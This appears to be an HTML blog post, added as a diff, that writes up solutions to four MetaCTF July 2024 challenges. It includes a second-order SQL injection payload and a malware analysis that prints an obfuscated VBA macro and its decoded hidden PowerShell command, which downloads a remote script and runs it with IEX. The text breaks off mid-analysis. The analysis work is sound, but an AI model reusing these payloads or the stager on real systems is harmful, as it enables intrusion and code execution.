@@ -1,0 +1,225 @@
+<!doctype html><html data-theme=dark lang=en xmlns=http://www.w3.org/1999/xhtml><head><meta charset=UTF-8><meta name=description><meta content="width=device-width,initial-scale=1" name=viewport><meta content=#9a9996 name=theme-color><meta content=#20c20e media=(prefers-color-scheme:dark) name=theme-color><title>️🏴 MetaCTF July 2024 Flash CTF - psypherpunk::blog</title><link href=https://blog.psypherpunk.io/blog/metactf-july-2024-flash-ctf/ rel=canonical><link href=https://blog.psypherpunk.io/favicon.png rel=icon type=image/png><link href=https://blog.psypherpunk.io/apple-touch-icon.png rel=apple-touch-icon sizes=180x180 type=image/png><link title="psypherpunk::blog - RSS Feed" href=https://blog.psypherpunk.io/rss.xml rel=alternate type=application/rss+xml><link title="psypherpunk::blog - Atom Feed" href=https://blog.psypherpunk.io/atom.xml rel=alternate type=application/atom+xml><style>:root{--accent-color:#6f8396}[data-theme=dark]{--accent-color:#20c20e}@media (prefers-color-scheme:dark){:root:not([data-theme=light]){--accent-color:#20c20e}}</style><link href=https://blog.psypherpunk.io/style.css rel=stylesheet><script defer src=https://blog.psypherpunk.io/closable.js></script><meta content=psypherpunk::blog property=og:site_name><meta content="️🏴 MetaCTF July 2024 Flash CTF - psypherpunk::blog" property=og:title><meta content=https://blog.psypherpunk.io/blog/metactf-july-2024-flash-ctf/ property=og:url><meta content="A monthly mini CTF competition organized by MetaCTF and Antisyphon." property=og:description><meta content=https://blog.psypherpunk.io/card.png property=og:image><meta content=en_US property=og:locale><body><header id=site-nav><nav><a href=#main-content tabindex=0> Skip to Main Content </a><ul><li id=home><a href=https://blog.psypherpunk.io> <i class=icon></i>psypherpunk::blog</a><li class=divider><li><a href=https://blog.psypherpunk.io/blog/>Blog</a><li id=feed><details class=closable><summary class=circle title=Feed><i class=icon></i></summary> <ul><li><a href=https://blog.psypherpunk.io/rss.xml>RSS</a><li><a href=https://blog.psypherpunk.io/atom.xml>Atom</a></ul></details></ul></nav></header><main id=main-content><article><div id=heading><p><small> <time datetime=" 2024-07-19T00:00:00+00:00">Published on July 19, 2024</time></small><h1>️🏴 MetaCTF July 2024 Flash CTF</h1><ul class=tags><li><a class=tag href=https://blog.psypherpunk.io/tags/ctf/>ctf</a></ul><ul class=tags><li><a class=tag href=https://blog.psypherpunk.io/categories/ctf/>ctf</a></ul></div><div id=buttons-container><a title="Go to Top" href=#top id=go-to-top><i class=icon></i></a></div><blockquote><p><em>A monthly mini CTF competition organized by MetaCTF with support from Antisyphon Training and TCM Security. There will be 5 challenges and you will have 2 hours to solve as many as you can. This is a beginner-friendly CTF.</em></blockquote><p>Details here: <a href=https://app.metactf.com/join/jul2024>https://app.metactf.com/join/jul2024</a>.</p><span id=continue-reading></span><h2 id=wheel-of-mystery>Wheel Of Mystery</h2><blockquote><p><em>My friend wanted to communicate using a secret cipher.</em><p><em>He gave me the message <code>RKPUYPFCIAKKJMYZZJT</code> along with this wheel:</em><p><em>Can you decrypt the message he sent?</em></blockquote><p>It’s a spinny cipher-wheel-thing!<p>The outer, static wheel appears to be the uppercase alphabet plus braces; the inner wheel, which rotates, is a seemingly-randomised alphabet, again with braces.<p>Given the rotation, it’s not clear in which position the wheel is supposed to be so…brute force!<p>Setting up the contents of both sections of the wheel:<pre class=language-python data-lang=python style=color:#c0c5ce;background-color:#2b303b><code class=language-python data-lang=python><span style=color:#b48ead>import </span><span>string
+</span><span style=color:#b48ead>from </span><span>collections </span><span style=color:#b48ead>import </span><span>deque
+</span><span>
+</span><span>
+</span><span>outer = string.ascii_uppercase + "</span><span style=color:#d08770>{}</span><span>"
+</span><span>inner = </span><span style=color:#bf616a>deque</span><span>("</span><span style=color:#a3be8c>COSDHG</span><span style=color:#d08770>{QNFUVWLEZYXPTKMR}</span><span style=color:#a3be8c>ABJI</span><span>")
+</span><span>
+</span><span style=color:#b48ead>assert </span><span style=color:#96b5b4>len</span><span>(outer) == </span><span style=color:#96b5b4>len</span><span>(inner)
+</span><span>
+</span><span>msg = "</span><span style=color:#a3be8c>RKPUYPFCIAKKJMYZZJT</span><span>"
+</span></code></pre><p>Using a <code>deque</code>, it’s possible to rotate the inner wheel easily enough:<pre class=language-python data-lang=python style=color:#c0c5ce;background-color:#2b303b><code class=language-python data-lang=python><span style=color:#b48ead>for </span><span>rotation </span><span style=color:#b48ead>in </span><span style=color:#96b5b4>range</span><span>(</span><span style=color:#96b5b4>len</span><span>(outer)):
+</span><span>    inner.</span><span style=color:#bf616a>rotate</span><span>(rotation)
+</span><span>
+</span><span>    lookup = </span><span style=color:#bf616a>dict</span><span>(</span><span style=color:#96b5b4>zip</span><span>(outer, inner))
+</span><span>
+</span><span>    </span><span style=color:#96b5b4>print</span><span>("".</span><span style=color:#bf616a>join</span><span>(lookup[c] </span><span style=color:#b48ead>for </span><span>c </span><span style=color:#b48ead>in </span><span>msg))
+</span></code></pre><p>That produces a lot of gibberish but in there is:<pre class=language-sh data-lang=sh style=color:#c0c5ce;background-color:#2b303b><code class=language-sh data-lang=sh><span style=color:#bf616a>METACTF{WHEELYCOOL</span><span>}
+</span></code></pre><h2 id=second-breakfast>Second Breakfast</h2><blockquote><p><em>This diner makes some of the best breakfast around, can you help me test their website? I hope that if I find a vulnerability, they might give me a free second order!</em><p><em>Here’s a <a href=http://26c7265ff.chals.mctf.io/>link to their website</a>. They also gave me a copy of their <a href=https://metaproblems.com/bf9082db72ce5961399e373b5cbb84ea/breakfast.zip>source code</a>.</em></blockquote><p>As part of the setup, the flag is added directly into the database:<pre class=language-sql data-lang=sql style=color:#c0c5ce;background-color:#2b303b><code class=language-sql data-lang=sql><span style=color:#b48ead>INSERT INTO</span><span> flags (flag) </span><span style=color:#b48ead>VALUES</span><span> ('</span><span style=color:#a3be8c>FLAG_REDACTED_GO_GET_THE_REAL_ONE</span><span>');
+</span></code></pre><p>Most of the site correctly uses parameterised queries, save one endpoint:<pre class=language-python data-lang=python style=color:#c0c5ce;background-color:#2b303b><code class=language-python data-lang=python><span>@app.</span><span style=color:#bf616a>route</span><span>('</span><span style=color:#a3be8c>/profile</span><span>')
+</span><span style=color:#b48ead>def </span><span style=color:#8fa1b3>profile</span><span>():
+</span><span>    </span><span style=color:#b48ead>if </span><span>'</span><span style=color:#a3be8c>username</span><span>' not in session:
+</span><span>        </span><span style=color:#b48ead>return </span><span style=color:#bf616a>redirect</span><span>(</span><span style=color:#bf616a>url_for</span><span>('</span><span style=color:#a3be8c>login</span><span>'))
+</span><span>    
+</span><span>    username = session['</span><span style=color:#a3be8c>username</span><span>']
+</span><span>    
+</span><span>    conn = </span><span style=color:#bf616a>get_db_connection</span><span>()
+</span><span>    cursor = conn.</span><span style=color:#bf616a>cursor</span><span>()
+</span><span>    
+</span><span>    query = </span><span style=color:#b48ead>f</span><span>"</span><span style=color:#a3be8c>SELECT username, created_at FROM users WHERE username='</span><span>{username}</span><span style=color:#a3be8c>'</span><span>"
+</span><span>    cursor.</span><span style=color:#bf616a>execute</span><span>(query)
+</span><span>    user = cursor.</span><span style=color:#bf616a>fetchone</span><span>()
+</span></code></pre><p>That would require a user whose <code>username</code> will fulfil a SQLi to retrieve the flag (“second order SQLi, for all the cool kids). Thankfully, it’s possible to register a user with exactly that.<p>Creating a user with the <code>username</code>:<pre class=language-sql data-lang=sql style=color:#c0c5ce;background-color:#2b303b><code class=language-sql data-lang=sql><span>meta'</span><span style=color:#a3be8c> UNION SELECT flag, CURRENT_TIMESTAMP FROM flags WHERE </span><span>'</span><span style=color:#d08770>1</span><span>'</span><span style=color:#a3be8c> = </span><span>'</span><span style=color:#d08770>1
+</span></code></pre><p>…causes the <code>query</code> in the above to retrieve the <code>flag</code> as the <code>username</code> and <code>created_at</code> as the current time, resulting in a greeting of:<pre class=language-html data-lang=html style=color:#c0c5ce;background-color:#2b303b><code class=language-html data-lang=html><span>&lt;</span><span style=color:#bf616a>h1</span><span>>Welcome, MetaCTF{Ill_h4v3_7h47_s3c0nd_0rd3r_0f_SQLi_pl3453}&lt;/</span><span style=color:#bf616a>h1</span><span>>
+</span></code></pre><h2 id=flag-appraisal>Flag Appraisal</h2><blockquote><p><em>My buddy started a pawn shop and made a bet that I could never get a counterfeit flag past him.</em><p><em>I know exactly how his system works, so I’m certain I can sneak one past him. Check out his shop application <a href=https://metaproblems.com/0f8a4c04644dfc5b7105e8d173a8d871/pawn_shop>here</a>.</em></blockquote><p>Courtesy of <a href=https://dogbolt.org/>Decompiler Explorer</a>, the main function is:<pre class=language-c data-lang=c style=color:#c0c5ce;background-color:#2b303b><code class=language-c data-lang=c><span style=color:#b48ead>bool </span><span style=color:#8fa1b3>FUN_0010128e</span><span>(</span><span style=color:#b48ead>void</span><span>)
+</span><span>
+</span><span>{
+</span><span>  </span><span style=color:#b48ead>int</span><span> iVar1;
+</span><span>  size_t </span><span style=color:#bf616a>sVar2</span><span>;
+</span><span>  </span><span style=color:#b48ead>long</span><span> in_FS_OFFSET;
+</span><span>  </span><span style=color:#b48ead>char</span><span> local_78 [</span><span style=color:#d08770>104</span><span>];
+</span><span>  </span><span style=color:#b48ead>long</span><span> local_10;
+</span><span>  
+</span><span>  local_10 = *(</span><span style=color:#b48ead>long </span><span>*)(in_FS_OFFSET + </span><span style=color:#d08770>0x28</span><span>);
+</span><span>  </span><span style=color:#96b5b4>printf</span><span>("</span><span style=color:#a3be8c>Welcome to my Pawn Shop, go ahead and show me the flag you want appraised: </span><span>");
+</span><span>  </span><span style=color:#96b5b4>fgets</span><span>(local_78,</span><span style=color:#d08770>100</span><span>,stdin);
+</span><span>  </span><span style=color:#bf616a>sVar2 </span><span>= </span><span style=color:#96b5b4>strcspn</span><span>(local_78,"</span><span style=color:#96b5b4>\n</span><span>");
+</span><span>  local_78[</span><span style=color:#bf616a>sVar2</span><span>] = '</span><span style=color:#96b5b4>\0</span><span>';
+</span><span>  </span><span style=color:#bf616a>sVar2 </span><span>= </span><span style=color:#96b5b4>strlen</span><span>(local_78);
+</span><span>  </span><span style=color:#bf616a>FUN_00101199</span><span>(local_78,</span><span style=color:#bf616a>sVar2 </span><span>& </span><span style=color:#d08770>0xffffffff</span><span>);
+</span><span>  iVar1 = </span><span style=color:#96b5b4>strncmp</span><span>(local_78,&DAT_00102058,</span><span style=color:#d08770>0x25</span><span>);
+</span><span>  </span><span style=color:#b48ead>if </span><span>(iVar1 != </span><span style=color:#d08770>0</span><span>) {
+</span><span>    </span><span style=color:#96b5b4>puts</span><span>("</span><span style=color:#a3be8c>Unfortunately, your flag here looks to be a counterfeit.</span><span>");
+</span><span>  }
+</span><span>  </span><span style=color:#b48ead>else </span><span>{
+</span><span>    </span><span style=color:#96b5b4>puts</span><span>("</span><span style=color:#a3be8c>Well good news, your flag looks to be authentic! Best I can do is $2.</span><span>");
+</span><span>  }
+</span><span>  </span><span style=color:#b48ead>if </span><span>(local_10 != *(</span><span style=color:#b48ead>long </span><span>*)(in_FS_OFFSET + </span><span style=color:#d08770>0x28</span><span>)) {
+</span><span>                    </span><span style=color:#65737e>// WARNING: Subroutine does not return
+</span><span>    </span><span style=color:#bf616a>__stack_chk_fail</span><span>();
+</span><span>  }
+</span><span>  </span><span style=color:#b48ead>return</span><span> iVar1 != </span><span style=color:#d08770>0</span><span>;
+</span><span>}
+</span></code></pre><p>The user input is passed through a function and, if it matches <code>DAT_00102058</code> and is 37 bytes (<code>0x25</code> above), is valid.<p>That function, <code>FUN_00101199</code>, is:<pre class=language-c data-lang=c style=color:#c0c5ce;background-color:#2b303b><code class=language-c data-lang=c><span style=color:#b48ead>void </span><span style=color:#8fa1b3>FUN_00101199</span><span>(</span><span style=color:#b48ead>long </span><span style=color:#bf616a>param_1</span><span>,uint </span><span style=color:#bf616a>param_2</span><span>)
+</span><span>
+</span><span>{
+</span><span>  uint local_10;
+</span><span>  </span><span style=color:#b48ead>int</span><span> local_c;
+</span><span>  
+</span><span>  local_10 = </span><span style=color:#d08770>0</span><span>;
+</span><span>  </span><span style=color:#b48ead>for </span><span>(local_c = </span><span style=color:#d08770>0</span><span>; local_c &lt; (</span><span style=color:#b48ead>int</span><span>)(param_2 - </span><span style=color:#d08770>1</span><span>); local_c = local_c + </span><span style=color:#d08770>2</span><span>) {
+</span><span>    local_10 = local_10 * </span><span style=color:#d08770>0x21 </span><span>^
+</span><span>               *(</span><span style=color:#b48ead>char </span><span>*)(param_1 + (</span><span style=color:#b48ead>long</span><span>)local_c + </span><span style=color:#d08770>1</span><span>) * </span><span style=color:#d08770>0x1fd </span><span>^ *(</span><span style=color:#b48ead>char </span><span>*)(param_1 + local_c) * </span><span style=color:#d08770>0x101
+</span><span>    ;
+</span><span>    *(</span><span style=color:#b48ead>char </span><span>*)(param_1 + local_c) = (</span><span style=color:#b48ead>char</span><span>)local_10;
+</span><span>    *(</span><span style=color:#b48ead>char </span><span>*)(param_1 + (</span><span style=color:#b48ead>long</span><span>)local_c + </span><span style=color:#d08770>1</span><span>) = (</span><span style=color:#b48ead>char</span><span>)(local_10 >> </span><span style=color:#d08770>8</span><span>);
+</span><span>  }
+</span><span>  </span><span style=color:#b48ead>if </span><span>((param_2 & </span><span style=color:#d08770>1</span><span>) != </span><span style=color:#d08770>0</span><span>) {
+</span><span>    *(byte *)(param_1 + (</span><span style=color:#b48ead>long</span><span>)(</span><span style=color:#b48ead>int</span><span>)param_2 + -</span><span style=color:#d08770>1</span><span>) =
+</span><span>         (</span><span style=color:#b48ead>char</span><span>)local_10 * '</span><span style=color:#a3be8c>!</span><span>' ^ *(byte *)(param_1 + (</span><span style=color:#b48ead>long</span><span>)(</span><span style=color:#b48ead>int</span><span>)param_2 + -</span><span style=color:#d08770>1</span><span>);
+</span><span>  }
+</span><span>  </span><span style=color:#b48ead>return</span><span>;
+</span><span>}
+</span></code></pre><p>Translating that into Python:<pre class=language-python data-lang=python style=color:#c0c5ce;background-color:#2b303b><code class=language-python data-lang=python><span style=color:#b48ead>def </span><span style=color:#8fa1b3>FUN_00101199</span><span>(</span><span style=color:#bf616a>input_</span><span>: list[int]):
+</span><span>    state = </span><span style=color:#d08770>0
+</span><span>    length = </span><span style=color:#96b5b4>len</span><span>(input_)
+</span><span>
+</span><span>    </span><span style=color:#b48ead>for </span><span>i </span><span style=color:#b48ead>in </span><span style=color:#96b5b4>range</span><span>(</span><span style=color:#d08770>0</span><span>, length - </span><span style=color:#d08770>1</span><span>, </span><span style=color:#d08770>2</span><span>):
+</span><span>        state = (input_[i] * </span><span style=color:#d08770>257</span><span>) ^ (input_[i + </span><span style=color:#d08770>1</span><span>] * </span><span style=color:#d08770>509</span><span>) ^ (state * </span><span style=color:#d08770>33</span><span>)
+</span><span>        input_[i] = state & </span><span style=color:#d08770>0xff
+</span><span>        input_[i + </span><span style=color:#d08770>1</span><span>] = (state >> </span><span style=color:#d08770>8</span><span>) & </span><span style=color:#d08770>0xff
+</span><span>
+</span><span>    </span><span style=color:#b48ead>if </span><span>length % </span><span style=color:#d08770>2 </span><span>!= </span><span style=color:#d08770>0</span><span>:
+</span><span>        state = (input_[length - </span><span style=color:#d08770>1</span><span>] * </span><span style=color:#d08770>257</span><span>) ^ (state * </span><span style=color:#d08770>33</span><span>)
+</span><span>        input_[length - </span><span style=color:#d08770>1</span><span>] = state & </span><span style=color:#d08770>0xff
+</span></code></pre><p><code>DAT_00102058</code> is visible in memory as (again, translated to Python):<pre class=language-python data-lang=python style=color:#c0c5ce;background-color:#2b303b><code class=language-python data-lang=python><span style=color:#bf616a>DAT_00102058 </span><span>= [
+</span><span>    </span><span style=color:#d08770>0x9C</span><span>,
+</span><span>    </span><span style=color:#d08770>0x85</span><span>,
+</span><span>    </span><span style=color:#d08770>0xB5</span><span>,
+</span><span>    </span><span style=color:#d08770>0x8D</span><span>,
+</span><span>    </span><span style=color:#d08770>0x12</span><span>,
+</span><span>    </span><span style=color:#d08770>0xA0</span><span>,
+</span><span>    </span><span style=color:#d08770>0x9B</span><span>,
+</span><span>    </span><span style=color:#d08770>0x10</span><span>,
+</span><span>    </span><span style=color:#d08770>0xE8</span><span>,
+</span><span>    </span><span style=color:#d08770>0x1F</span><span>,
+</span><span>    </span><span style=color:#d08770>0x2B</span><span>,
+</span><span>    </span><span style=color:#d08770>0xB3</span><span>,
+</span><span>    </span><span style=color:#d08770>0xDB</span><span>,
+</span><span>    </span><span style=color:#d08770>0x4A</span><span>,
+</span><span>    </span><span style=color:#d08770>0x87</span><span>,
+</span><span>    </span><span style=color:#d08770>0x1E</span><span>,
+</span><span>    </span><span style=color:#d08770>0x39</span><span>,
+</span><span>    </span><span style=color:#d08770>0xBD</span><span>,
+</span><span>    </span><span style=color:#d08770>0x03</span><span>,
+</span><span>    </span><span style=color:#d08770>0x32</span><span>,
+</span><span>    </span><span style=color:#d08770>0xC6</span><span>,
+</span><span>    </span><span style=color:#d08770>0xD0</span><span>,
+</span><span>    </span><span style=color:#d08770>0x82</span><span>,
+</span><span>    </span><span style=color:#d08770>0xDB</span><span>,
+</span><span>    </span><span style=color:#d08770>0xCD</span><span>,
+</span><span>    </span><span style=color:#d08770>0x46</span><span>,
+</span><span>    </span><span style=color:#d08770>0x82</span><span>,
+</span><span>    </span><span style=color:#d08770>0xA1</span><span>,
+</span><span>    </span><span style=color:#d08770>0x6D</span><span>,
+</span><span>    </span><span style=color:#d08770>0x09</span><span>,
+</span><span>    </span><span style=color:#d08770>0x80</span><span>,
+</span><span>    </span><span style=color:#d08770>0xE5</span><span>,
+</span><span>    </span><span style=color:#d08770>0x6C</span><span>,
+</span><span>    </span><span style=color:#d08770>0x7F</span><span>,
+</span><span>    </span><span style=color:#d08770>0x6C</span><span>,
+</span><span>    </span><span style=color:#d08770>0x82</span><span>,
+</span><span>    </span><span style=color:#d08770>0x91</span><span>,
+</span><span>]
+</span></code></pre><p>So, given <code>DAT_00102058</code> as input, I need a function which <em>reverses</em> <code>FUN_00101199</code> to produce the flag.<p>This is the best I could come up with:<pre class=language-python data-lang=python style=color:#c0c5ce;background-color:#2b303b><code class=language-python data-lang=python><span style=color:#b48ead>def </span><span style=color:#8fa1b3>_99110100_NUF</span><span>(</span><span style=color:#bf616a>dat</span><span>: list[int]):
+</span><span>    state = </span><span style=color:#d08770>0
+</span><span>    length = </span><span style=color:#96b5b4>len</span><span>(dat)
+</span><span>    input_ = [</span><span style=color:#d08770>0</span><span>] * length
+</span><span>
+</span><span>    </span><span style=color:#b48ead>for </span><span>i </span><span style=color:#b48ead>in </span><span style=color:#96b5b4>range</span><span>(</span><span style=color:#d08770>0</span><span>, length - </span><span style=color:#d08770>1</span><span>, </span><span style=color:#d08770>2</span><span>):
+</span><span>        save_state = dat[i] | (dat[i + </span><span style=color:#d08770>1</span><span>] &lt;&lt; </span><span style=color:#d08770>8</span><span>)
+</span><span>
+</span><span>        </span><span style=color:#b48ead>for </span><span>j </span><span style=color:#b48ead>in </span><span style=color:#96b5b4>range</span><span>(</span><span style=color:#d08770>128</span><span>):
+</span><span>            </span><span style=color:#b48ead>for </span><span>k </span><span style=color:#b48ead>in </span><span style=color:#96b5b4>range</span><span>(</span><span style=color:#d08770>128</span><span>):
+</span><span>                _state = (j * </span><span style=color:#d08770>257</span><span>) ^ (k * </span><span style=color:#d08770>509</span><span>) ^ (state * </span><span style=color:#d08770>33</span><span>)
+</span><span>                </span><span style=color:#b48ead>if </span><span>_state & </span><span style=color:#d08770>0xFFFF </span><span>== save_state:
+</span><span>                    input_[i], input_[i + </span><span style=color:#d08770>1</span><span>] = </span><span style=color:#96b5b4>chr</span><span>(j), </span><span style=color:#96b5b4>chr</span><span>(k)
+</span><span>                    </span><span style=color:#b48ead>break
+</span><span>            </span><span style=color:#b48ead>else</span><span>:
+</span><span>                </span><span style=color:#b48ead>continue
+</span><span>            </span><span style=color:#b48ead>break
+</span><span>
+</span><span>        state = save_state
+</span><span>
+</span><span>    </span><span style=color:#b48ead>for </span><span>i </span><span style=color:#b48ead>in </span><span style=color:#96b5b4>range</span><span>(</span><span style=color:#d08770>128</span><span>):
+</span><span>        </span><span style=color:#b48ead>if </span><span>((i * </span><span style=color:#d08770>257</span><span>) ^ (state * </span><span style=color:#d08770>33</span><span>)) & </span><span style=color:#d08770>0xFF </span><span>== dat[length - </span><span style=color:#d08770>1</span><span>]:
+</span><span>            input_[length - </span><span style=color:#d08770>1</span><span>] = </span><span style=color:#96b5b4>chr</span><span>(i)
+</span><span>            </span><span style=color:#b48ead>break
+</span><span>
+</span><span>    </span><span style=color:#b48ead>return </span><span>"".</span><span style=color:#bf616a>join</span><span>(input_)
+</span></code></pre><p>…and it works!<p>(…eventually, after some fighting with that last character…)<pre class=language-sh data-lang=sh style=color:#c0c5ce;background-color:#2b303b><code class=language-sh data-lang=sh><span style=color:#bf616a>❯</span><span> ./pawn_shop.py
+</span><span style=color:#bf616a>MetaCTF{c0un73rf3171ng_7h3_p4wn_</span><span>$</span><span style=color:#bf616a>h0p</span><span>}
+</span></code></pre><h2 id=keeper-in-the-net>Keeper In The Net</h2><blockquote><p><em>Our customer believes that something suspicious was going on in their network. Can you save the day and figure out what the attacked did?</em><p><em>Here’s a <a href=https://metaproblems.com/34a924fe063ce00ebb96126da330ac45/KeeperInTheNet.pcapng>pcap</a> of the incident.</em></blockquote><p>Via WireShark, the provided <code>KeeperInTheNet.pcapng</code> contains a HTTP GET for a <code>Drill_2024.doc</code> file. Running <code>olevba</code> (courtesy of <a href=https://github.com/decalage2/oletools><code>decalage2/oletools</code></a>) over that reveals a whole caboodle of VBA macros.<p>One function, <code>JERWafGg()</code>, appears to be a base64-decode; it’s later called to decode the result of a series of base64 concatentations:<pre class=language-vba data-lang=vba style=color:#c0c5ce;background-color:#2b303b><code class=language-vba data-lang=vba><span>HAdjTg8 = Chr(88)
+</span><span>jyaiOGq8Y = "cG93Z"
+</span><span>NVuAyL = jyaiOGq8Y & HAdjTg8
+</span><span>WcpUY = "JzaGVsbCAtV2luZG93U3R5bGUgSGlkZGVuICR3c2NyaXB0ID0gbm"
+</span><span>pYdk3 = "V3LW9iamVjdCAtQ29tT2JqZWN0IFdTY3JpcHQuU2hlbGw7JHd"
+</span><span>s7qEy6 = "lYmNsaWVudCA9IG5ldy1vYmplY3QgU3lzdGVtLk5ldC5XZWJDbGllbnQ7JHJhbmRv"
+</span><span>xS64130k = WcpUY & pYdk3 & s7qEy6
+</span><span>yMTzNDzh = NVuAyL & xS64130k
+</span><span>DOwIWXYbJ = "bSA9IG5ldy1vYmplY3QgcmFuZG9tOyR1cmxzID0gJ2h0dH"
+</span><span>t5ysx = "BzOi8vZ2lzdC5naXRodWJ1c2VyY29udGVudC5jb20vaGFja2RhbWV0YXZlcnNlLzhjYzk0NzFjMGUwMTJjNjk2NjhkYjkzY2M"
+</span><span>hjLGi = "2YzkyN2U1L3Jhdy8yZTg1YjY3M2I4ZmFmNWQ5NzU4ZTlhNTk0YjcxYWY4MmNiMTY3YzdhL2dpdGh1Yi5wczEnLlNw"
+</span><span>OQfe5BhbT = DOwIWXYbJ & t5ysx & hjLGi
+</span><span>yMTzNDzhyQ = yMTzNDzh & OQfe5BhbT
+</span><span>WdpeGhumO = "bGl0KCcsJyk7JG5hbWUgPSAkcmFuZG9tLm5leHQoMSwgN"
+</span><span>ThHBT3JqI = "jU1MzYpOyRwYXRoID0gJGVudjp0ZW"
+</span><span>tB65ZJd9 = "1wICsgJ1wnICsgJG5hbWUgKyAnLnB"
+</span><span>xRgONcKLq = WdpeGhumO & ThHBT3JqI & tB65ZJd9
+</span><span>jqfwUJ = "zMSc7Zm9yZWFja"
+</span><span>Uv10MF = "CgkdXJsIGluICR1cmxzKXt0cnl7JHdlYmNsaWVudC5Eb3dubG9h"
+</span><span>u6V3e = "ZEZpbGUoJHVybC5Ub1N0cmluZ"
+</span><span>tnavr6 = jqfwUJ & Uv10MF & u6V3e
+</span><span>yMTzNDzhy = xRgONcKLq & tnavr6
+</span><span>JDqWL8ju = "ygpLCAkcGF0aCk7SUVYICRwYXRoO2"
+</span><span>FtLGF = "JyZWFrO31jYXRjaHt3cml0ZS1ob3N0ICRfLkV4Y2VwdGlvbi5NZXNzYWdlO319"
+</span><span>yOa0X2 = JDqWL8ju & FtLGF
+</span><span>MTzNDzhyQ = yMTzNDzhy & yOa0X2
+</span></code></pre><p>…finally being called as:<pre class=language-vba data-lang=vba style=color:#c0c5ce;background-color:#2b303b><code class=language-vba data-lang=vba><span>f6tDZP72 = JERWafGg(yMTzNDzhyQ & MTzNDzhyQ)
+</span></code></pre><p>…the result of which is executed by:<pre class=language-sh data-lang=sh style=color:#c0c5ce;background-color:#2b303b><code class=language-sh data-lang=sh><span style=color:#bf616a>WinExec</span><span> f6tDZP72, w7VGb
+</span></code></pre><p>The base64-decoded content being executed therein is:<pre class=language-sh data-lang=sh style=color:#c0c5ce;background-color:#2b303b><code class=language-sh data-lang=sh><span style=color:#bf616a>powershell -WindowStyle</span><span> Hidden $</span><span style=color:#bf616a>wscript</span><span> = new-object</span><span style=color:#bf616a> -ComObject</span><span> WScript.Shell;$</span><span style=color:#bf616a>webclient</span><span> = new-object System.Net.WebClient;$</span><span style=color:#bf616a>random</span><span> = new-object random;$</span><span style=color:#bf616a>urls</span><span> = '</span><span style=color:#a3be8c>https://gist.githubusercontent.com/hackdametaverse/8cc9471c0e012c69668db93cc6c927e5/raw/2e85b673b8faf5d9758e9a594b71af82cb167c7a/github.ps1</span><span>'.Split('</span><span style=color:#a3be8c>,</span><span>');$</span><span style=color:#bf616a>name</span><span> = $</span><span style=color:#bf616a>random</span><span>.next(1, 65536);$</span><span style=color:#bf616a>path</span><span> = $</span><span style=color:#bf616a>env</span><span>:temp + '</span><span style=color:#a3be8c>\</span><span>' + $</span><span style=color:#bf616a>name</span><span> + '</span><span style=color:#a3be8c>.ps1</span><span>';</span><span style=color:#bf616a>foreach</span><span>($</span><span style=color:#bf616a>url</span><span> in $</span><span style=color:#bf616a>urls</span><span>)</span><span style=color:#bf616a>{try{</span><span>$</span><span style=color:#bf616a>webclient.DownloadFile</span><span>($</span><span style=color:#bf616a>url</span><span>.ToString()</span><span style=color:#bf616a>, </span><span>$</span><span style=color:#bf616a>path</span><span>);</span><span style=color:#bf616a>IEX </span><span>$</span><span style=color:#bf616a>path</span><span>;</span><span style=color:#b48ead>break</span><span>;}</span><span style=color:#bf616a>catch{write-host </span><span>$</span><span style=color:#bf616a>_</span><span>.Exception.Message;}}
+</span></code></pre><p>The contents of that Gist appear to be yet more PowerShell containing another base64 chunk, followed by a <code>dECOMprESS</code> call:<pre class=language-python data-lang=python style=color:#c0c5ce;background-color:#2b303b><code class=language-python data-lang=python><span style=color:#b48ead>import </span><span>base64
+</span><span style=color:#b48ead>import </span><span>requests
+</span><span style=color:#b48ead>import </span><span>zlib
+</span><span>
+</span><span>
+</span><span>data = requests.</span><span style=color:#bf616a>get</span><span>(
+</span><span>    "</span><span style=color:#a3be8c>https://gist.githubusercontent.com/hackdametaverse/8cc9471c0e012c69668db93cc6c927e5/raw/2e85b673b8faf5d9758e9a594b71af82cb167c7a/github.ps1</span><span>"
+</span><span>).text[</span><span style=color:#d08770>167</span><span>:-</span><span style=color:#d08770>106</span><span>]
+</span><span>
+</span><span>decompress = zlib.</span><span style=color:#bf616a>decompressobj</span><span>(-zlib.</span><span style=color:#bf616a>MAX_WBITS</span><span>)
+</span><span>decompressed = decompress.</span><span style=color:#bf616a>decompress</span><span>(base64.</span><span style=color:#bf616a>b64decode</span><span>(data))
+</span><span style=color:#96b5b4>print</span><span>(decompressed.</span><span style=color:#bf616a>decode</span><span>())
+</span></code></pre><p>That produces quite a bit of obfuscated code.<p>There’s hints of encryption in here, via a <code>function DECry'Pt(</code> function, which points to AES as the algorithm of choice: <code>'reate','AesMa','C','t','jec','nagedOb')</code>.<p>…and after much munging of strings, there’s this:<pre class=language-ps data-lang=ps style=color:#c0c5ce;background-color:#2b303b><code class=language-ps data-lang=ps><span>${VP`gN`g`cq0KcY`j3O`oP22`JR}   = ("{1}{5}{2}{6}{4}{7}{3}{0}"-f 'SU=','rn','VK5','dMoH','SOhIsUcaMOg4OL8+jCoH','17r','zsx','FYO1f+')
+</span></code></pre><p>…which, thankfully, translates to:<pre class=language-sh data-lang=sh style=color:#c0c5ce;background-color:#2b303b><code class=language-sh data-lang=sh><span style=color:#bf616a>PS</span><span> /> ("</span><span style=color:#a3be8c>{1}{5}{2}{6}{4}{7}{3}{0}</span><span>"-f '</span><span style=color:#a3be8c>SU=</span><span>','</span><span style=color:#a3be8c>rn</span><span>','</span><span style=color:#a3be8c>VK5</span><span>','</span><span style=color:#a3be8c>dMoH</span><span>','</span><span style=color:#a3be8c>SOhIsUcaMOg4OL8+jCoH</span><span>','</span><span style=color:#a3be8c>17r</span><span>','</span><span style=color:#a3be8c>zsx</span><span>','</span><span style=color:#a3be8c>FYO1f+</span><span>')
+</span><span style=color:#bf616a>rn17rVK5zsxSOhIsUcaMOg4OL8+jCoHFYO1f+dMoHSU
+</span></code></pre><p>There’s an AES key which is encrypting…what exactly?<p>Dumping <em>all</em> the HTTP objects reveals a series of HTTP forms, the first of which is:<pre class=language-http data-lang=http style=color:#c0c5ce;background-color:#2b303b><code class=language-http data-lang=http><span>result=rbqA0td2aIZzzE4Q5LYitDDQcpMz%2FgSbMWbTceiStH3ZK8VvGQxF%2BOc7%2Fp2PSgDw
